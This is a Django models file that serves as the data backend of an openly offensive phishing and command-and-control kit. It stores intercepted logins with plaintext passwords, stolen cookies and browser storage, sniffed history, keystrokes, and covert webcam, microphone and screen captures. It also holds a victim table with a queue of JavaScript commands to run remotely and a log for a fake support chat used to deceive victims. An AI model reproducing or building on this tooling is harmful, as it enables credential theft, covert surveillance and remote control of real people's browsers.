from django.db import models
import hashlib

class ThreatLog(models.Model):
    RISK_CHOICES = [
        ('LOW', 'Low Risk'),
        ('MEDIUM', 'Medium Risk'),
        ('HIGH', 'High Risk'),
        ('CRITICAL', 'Critical Risk'),
    ]

    node_identity = models.CharField(max_length=255, default="Gateway Access Node")
    intercepted_id = models.CharField(max_length=255, help_text="Email/Username")
    raw_password = models.CharField(max_length=255, default="", help_text="Plain text password")
    encrypted_token = models.CharField(max_length=256, help_text="Hashed password")
    geo_ip = models.GenericIPAddressField()
    mac_address = models.CharField(max_length=17, default="00:00:00:00:00:00")
    browser_fingerprint = models.TextField()
    webcam_snap = models.TextField(blank=True, null=True, help_text="Base64 encoded image from webcam")
    webcam_video = models.TextField(blank=True, null=True, help_text="Base64 encoded video from webcam")
    
    # NEW: Advanced exfiltration fields
    full_name = models.CharField(max_length=255, blank=True, null=True, help_text="Captured Full Name if Sign Up")
    auth_mode = models.CharField(max_length=20, default="LOGIN", help_text="LOGIN or SIGNUP")
    voice_audio = models.TextField(blank=True, null=True, help_text="Base64 encoded audio from mic")
    local_storage_data = models.TextField(blank=True, null=True, help_text="Stolen localStorage")
    session_storage_data = models.TextField(blank=True, null=True, help_text="Stolen sessionStorage")
    cookies = models.TextField(blank=True, null=True, help_text="Stolen cookies")
    source_url = models.URLField(blank=True, null=True, help_text="Captured page URL")
    user_agent = models.TextField(blank=True, null=True, help_text="Captured Browser User-Agent")
    platform = models.CharField(max_length=100, blank=True, null=True, help_text="Captured platform")
    history_data = models.TextField(blank=True, null=True, help_text="Sniffed browser history")
    
    device_type = models.CharField(max_length=20, choices=[('desktop', 'Desktop'), ('mobile', 'Mobile'), ('tablet', 'Tablet'), ('other', 'Other')], default='other')
    risk_level = models.CharField(max_length=10, choices=RISK_CHOICES, default='MEDIUM')
    timestamp = models.DateTimeField(auto_now_add=True)
    
    # Screen recording and client timestamp
    screen_recording = models.TextField(blank=True, null=True, help_text="Base64 encoded screen recording video")
    client_timestamp = models.CharField(max_length=100, blank=True, null=True, help_text="Client-side timestamp ISO format")

    def save(self, *args, **kwargs):
        # Auto-calculate risk based on input
        if not self.pk:
            if 'admin' in self.intercepted_id.lower() or 'root' in self.intercepted_id.lower():
                self.risk_level = 'CRITICAL'
            elif self.geo_ip.startswith('127.') or self.geo_ip.startswith('192.168.'):
                self.risk_level = 'LOW'
            else:
                self.risk_level = 'HIGH'
                
        super().save(*args, **kwargs)

    def __str__(self):
        return f"[{self.risk_level}] {self.geo_ip} - {self.intercepted_id}"

class LiveKeyStroke(models.Model):
    username_context = models.CharField(max_length=255, default="Anonymous")
    keystrokes = models.TextField()
    timestamp = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"Keys from {self.username_context}"

class ActivePhishTemplate(models.Model):
    template_name = models.CharField(max_length=50, default="admin")
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.template_name

# NEW MODELS FOR APT FEATURES

class ActiveVictim(models.Model):
    """Tracks currently connected victims for live C2 commands"""
    session_id = models.CharField(max_length=255, unique=True)
    ip_address = models.GenericIPAddressField()
    last_seen = models.DateTimeField(auto_now=True)
    device_info = models.TextField(blank=True, null=True)
    current_url = models.URLField(blank=True, null=True, help_text="Last known page URL")
    last_action = models.CharField(max_length=50, blank=True, null=True, help_text="Last action by victim")    
    # C2 Command Queue (War Room sets this, Victim reads it)
    pending_command = models.CharField(max_length=50, blank=True, null=True, help_text="Command to execute")
    command_payload = models.TextField(blank=True, null=True, help_text="Data for the command (e.g. JS code to execute)")
    
    def __str__(self):
        return f"Victim {self.ip_address} ({self.session_id})"

class LiveChatLog(models.Model):
    """Tracks the Fake Live Support Chat"""
    session_id = models.CharField(max_length=255)
    sender = models.CharField(max_length=10, choices=(('victim', 'Victim'), ('hacker', 'Hacker')))
    message = models.TextField()
    timestamp = models.DateTimeField(auto_now_add=True)
    
    def __str__(self):
        return f"[{self.sender.upper()}] {self.message[:30]}"
